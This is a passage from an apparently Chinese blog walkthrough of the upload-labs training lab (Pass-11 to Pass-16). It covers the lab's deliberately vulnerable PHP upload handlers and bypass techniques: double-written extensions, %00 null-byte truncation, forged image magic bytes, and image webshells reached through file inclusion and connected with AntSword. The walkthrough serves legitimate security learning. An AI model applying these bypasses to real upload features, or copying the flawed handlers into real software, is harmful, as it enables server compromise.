class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-variable">$file_name</span>;        <br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>str_ireplace 函数是 PHP 中的一个不区分大小写的字符串替换函数。它用于在给定的字符串（或字符串数组）中，将所有匹配的搜索字符串替换为指定的替换字符串，且不区分大小写。</p><p>在这个代码中，会将黑名单里的文件名全部替换为空，但只替换一次，所以可以用双写绕过。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021938525.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021943892.png"></p><h3 id="Pass-12-00截断绕过（POST）"><a href="#Pass-12-00截断绕过（POST）" class="headerlink" title="Pass-12_00截断绕过（POST）"></a>Pass-12_00截断绕过（POST）</h3><p>第12关开始进入白名单</p><p>前提条件：</p><p>1.php版本小于5.3</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021943167.png"></p><p>2.配置文件中<code>php.ini</code>中的<code>magic_quotes_gpc = On</code>需要修改为<code>magic_quotes_gpc = Off</code>，<strong>修改之后记得保存并重启</strong></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021943579.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>00截断原理：</strong></p><p>关键使用了空字符</p><p>在url编码中空字符为<code>%00</code></p><p>当传入文件时，用空字符截断文件名变成攻击性文件</p><p>例如：上传<code>example.php%00.jpg</code> 后在 URL 解码后会变成 <code>example.php\0.jpg</code>，当系统处理时<code>example.php\0.jpg</code> 会被文件系统保存为 <code>example.php</code>，从而达成目的。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944287.png"></p><p>进行更改</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944140.png"></p><p>上传成功后复制链接到蚁剑</p><p>将%之后的去除</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944986.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944368.png"></p><h3 id="Pass-13-00截断绕过（GET"><a href="#Pass-13-00截断绕过（GET" class="headerlink" title="Pass-13_00截断绕过（GET)"></a>Pass-13_00截断绕过（GET)</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$ext_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;jpg&#x27;</span>,<span class="hljs-string">&#x27;png&#x27;</span>,<span class="hljs-string">&#x27;gif&#x27;</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>,<span class="hljs-variable">$ext_arr</span>))&#123;<br>        <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>        <span class="hljs-variable">$img_path</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;save_path&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_ext</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传失败&quot;</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;只允许上传.jpg|.png|.gif类型文件！&quot;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>原理：</p><p>代码漏洞：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>],<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>通过<code>strrpos</code>查找文件名中的最后一个<code>.</code>的位置来获取文件拓展名</p><p>那么我们将文件名构造为 <code>webshell.php .jpg</code>（注意中间的空格），然后在十六进制（HEX）视图中将空格（ASCII <code>20</code>）改为空字节（HEX <code>00</code>）。最终文件名变为 <code>webshell.php\x00.jpg</code>（<code>\x00</code> 表示空字节）。</p><p>并且由于 PHP 在底层使用 C 字符串处理函数，当遇到空字节 <code>\x00</code> 时，<code>strrpos</code> 会认为字符串在 <code>\x00</code> 处结束。</p><p>因此，原始文件名 <code>webshell.php\x00.jpg</code> 会被截断为 <code>webshell.php</code>。</p><p>bp抓包：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944333.png"></p><p>在upload后添加文件名<code>webshell.php</code>并且在此文件名后添加空格，选中空格后，在右边的窗口将空格的HAX值（20）改为空字符的HAX值（00）</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944248.png"></p><p>将文件后缀名改为白名单上的</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944699.png"></p><p>上传成功后复制链接到蚁剑，删除%以及后边的东西</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944193.png"></p><p>连接成功</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021944440.png"></p><p><strong>对比 GET 和 POST 在 00 截断绕过中的区别</strong></p><table><thead><tr><th align="left"><strong>对比项</strong></th><th align="center"><strong>GET 请求</strong></th><th align="center"><strong>POST 请求</strong></th></tr></thead><tbody><tr><td align="left"><strong>参数位置</strong></td><td align="center">参数附加在 URL 中（如 <code>?file=test.php%00.jpg</code>）。</td><td align="center">参数在 HTTP 请求体中（如表单字段 <code>filename=&quot;test.php%00.jpg&quot;</code>）。</td></tr><tr><td align="left"><strong>常见漏洞场景</strong></td><td align="center">路径遍历、文件包含（如 <code>include($_GET[&#39;file&#39;])</code>）。</td><td align="center">文件上传、路径拼接（如 <code>move_uploaded_file($tmp, $_POST[&#39;path&#39;].$filename)</code>）。</td></tr><tr><td align="left"><strong>绕过示例</strong></td><td align="center"><code>http://example.com?file=shell.php%00.jpg</code> → 截断为 <code>shell.php</code>。</td><td align="center">上传文件名 <code>shell.php\x00.jpg</code> → 保存为 <code>shell.php</code>。</td></tr><tr><td align="left"><strong>防御难度</strong></td><td align="center">较难触发（需服务器允许 URL 中包含未编码的 <code>%00</code>）。</td><td align="center">较易触发（请求体中的空字节可能直接被处理）。</td></tr><tr><td align="left"><strong>实际利用频率</strong></td><td align="center">较低（现代框架&#x2F;服务器默认过滤 URL 中的空字节）。</td><td align="center">较高（文件上传功能中更常见，且空字节可能绕过扩展名检查）。</td></tr></tbody></table><hr><h3 id="Pass-14-图片马-文件包含漏洞"><a href="#Pass-14-图片马-文件包含漏洞" class="headerlink" title="Pass-14_图片马+文件包含漏洞"></a>Pass-14_图片马+文件包含漏洞</h3><p>首先分析代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getReailFileType</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;rb&quot;</span>);<span class="hljs-comment">//使用fopen()函数以二进制模式（&quot;rb&quot;）打开指定的文件</span><br>    <span class="hljs-variable">$bin</span> = <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$file</span>, <span class="hljs-number">2</span>); <span class="hljs-comment">//只读2字节，这里只读取两个字节是因为不同的文件类型通常在其头部有独特的标识符（也称为“魔术数字”），这些标识符足以区分常见的文件格式</span><br>    <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<br>    <span class="hljs-variable">$strInfo</span> = @<span class="hljs-title function_ invoke__">unpack</span>(<span class="hljs-string">&quot;C2chars&quot;</span>, <span class="hljs-variable">$bin</span>); <span class="hljs-comment">//将读取的2个字节解包为两个无符号字符（C2chars 表示解包为2个字符）；@ 用于抑制可能的错误（如文件不足2字节时解包失败）   </span><br>    <span class="hljs-variable">$typeCode</span> = <span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars1&#x27;</span>].<span class="hljs-variable">$strInfo</span>[<span class="hljs-string">&#x27;chars2&#x27;</span>]); <span class="hljs-comment">//将两个字节拼接成一个整数   </span><br>    <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;&#x27;</span>;    <br>    <span class="hljs-keyword">switch</span>(<span class="hljs-variable">$typeCode</span>)&#123;  <span class="hljs-comment">//匹配文件类型    </span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">255216</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;jpg&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">13780</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;png&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;        <br>        <span class="hljs-keyword">case</span> <span class="hljs-number">7173</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;gif&#x27;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:            <br>            <span class="hljs-variable">$fileType</span> = <span class="hljs-string">&#x27;unknown&#x27;</span>;<br>        &#125;    <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$fileType</span>;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_type</span> = <span class="hljs-title function_ invoke__">getReailFileType</span>(<span class="hljs-variable">$temp_file</span>);<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$file_type</span> == <span class="hljs-string">&#x27;unknown&#x27;</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.<span class="hljs-variable">$file_type</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>文件头字节与文件类型的对应关系：</strong></p><p>1.文字头：文字头是文件开头的几个字节，用来标识文件类型</p><p>JPEG 文件的前两个字节是 <code>FF D8</code>。</p><p>PNG 文件的前两个字节是 <code>89 50</code>。</p><p>GIF 文件的前两个字节是 <code>47 49</code>。（十六进制）</p><p>2.字节（Byte）：计算机中的最小存储单位</p><p>十六进制：<code>FF</code>、<code>D8</code></p><p>十进制： <code>255</code>、<code>216</code></p><p>二进制： <code>11111111</code>、<code>11011000</code></p><p>以jpg文件类型举例：</p><p>jpg文件前俩个字节是<code>FF D8</code>，  代码中通过 <code>unpack(&quot;C2chars&quot;, $bin)</code> 将文件头的两个字节解包，解包后<code>$strInfo[&#39;chars1&#39;] </code>是第一个字节（FF，即 255），<code>$strInfo[&#39;chars2&#39;]</code> 是第二个字节（D8，即 216）。<br>通过 <code>intval($strInfo[&#39;chars1&#39;].$strInfo[&#39;chars2&#39;])</code> 将两个十进制数拼接成一个整数，得到 <code>255216</code>。最后根据<code>switch($typeCode)</code>函数匹配到jpg文件。</p><p> 因此我们更改上传的文件的文件头：</p><p>在最前面输入两个任意字母，方便后面修改</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021945869.png"></p><p>使用010editor打开，打开十六进制</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021945773.png"></p><p>将61,61改为FF,D8</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021945070.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022105108.png"></p><p>保存后上传</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952518.png"></p><p>上传后蚁剑还不能链接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022056819.png"></p><p>接下来要用到文件包含漏洞</p><p><a href="https://blog.csdn.net/m0_46467017/article/details/126380415">文件包含漏洞全面详解-CSDN博客</a></p><p>点击题目中的文件包含漏洞链接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952122.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952242.png"></p><p>在新标签页打开图片找到图片链接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021952027.png"></p><p>记下文件名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">upload/5420250209113757.jpg<br></code></pre></td></tr></table></figure><p>文件包含漏洞：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?file=upload/+文件名称<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">?file=upload/5020250209113022.jpg<br></code></pre></td></tr></table></figure><p>页面没有报错，就可以用这个url通过蚁剑连接</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022057235.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953063.png"></p><p><code>.png</code>后缀：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953187.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953169.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953548.png"></p><p><code>.gif</code>后缀：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953865.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953702.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953596.png"></p><p>三种后缀都上传成功才算过关！</p><h3 id="Pass-15-图片马"><a href="#Pass-15-图片马" class="headerlink" title="Pass-15_图片马"></a>Pass-15_图片马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-variable">$types</span> = <span class="hljs-string">&#x27;.jpeg|.png|.gif&#x27;</span>;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$filename</span>))&#123;<br>        <span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$filename</span>);<br>        <span class="hljs-variable">$ext</span> = <span class="hljs-title function_ invoke__">image_type_to_extension</span>(<span class="hljs-variable">$info</span>[<span class="hljs-number">2</span>]);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$types</span>,<span class="hljs-variable">$ext</span>)&gt;=<span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$ext</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;upload_file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$res</span> = <span class="hljs-title function_ invoke__">isImage</span>(<span class="hljs-variable">$temp_file</span>);<br>    <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$res</span>)&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;文件未知，上传失败！&quot;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$img_path</span> = UPLOAD_PATH.<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-variable">$res</span>;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>,<span class="hljs-variable">$img_path</span>))&#123;<br>            <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;上传出错！&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这一关中出现了<code>getimagesize（）</code>函数，<code>getimagesize()</code> 是 PHP 中一个用于获取图像文件信息的函数，它可以返回图像的尺寸、类型、MIME 类型等信息。</p><p>因此我们需要一张图片，将一句话木马写入图片里</p><p>随便打开一张图片：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021953083.png"></p><p>将一句话木马写入最后，保存后上传。</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511022059295.png"></p><p>上传成功后同pass-14</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954792.png"></p><p><code>.png</code></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954713.png"></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202511021954964.png"></p><h3 id="Pass-16-图片马"><a href="#Pass-16-图片马" class="headerlink" title="Pass-16-图片马"></a>Pass-16-图片马</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">isImage</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>&#123;<br>    <span class="hljs-comment">//需要开启php_exif模块</span><br>    <span class="hljs-variable">$image_type</span> = <span class="hljs-title function_ invoke__">exif_imagetype</span>(<span class="hljs-variable">$filename</span>);<br>    <span class="hljs-keyword">switch</span> (<span class="hljs-variable">$image_type</span>) &#123;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_GIF:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;gif&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_JPEG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;jpg&quot;</span>;<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> IMAGETYPE_PNG:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;png&quot;</span>;<br>            <span class="hljs-keyword">break</span>;    <br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">break</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span 